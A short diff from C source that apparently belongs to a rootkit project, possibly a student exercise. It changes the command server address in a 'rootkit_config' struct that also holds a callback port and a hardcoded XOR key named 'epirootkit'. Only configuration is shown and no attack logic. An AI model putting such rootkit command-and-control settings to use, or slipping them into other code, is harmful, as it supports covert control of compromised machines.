@@ -32,7 +32,7 @@ static struct rootkit_config {
     char xor_key[32];
 } config = {
     .port = 4242,
-    .server_ip = "192.168.15.6",
+    .server_ip = "192.168.15.8",
     .buffer_size = 2048,
     .xor_key = "epirootkit"
 };
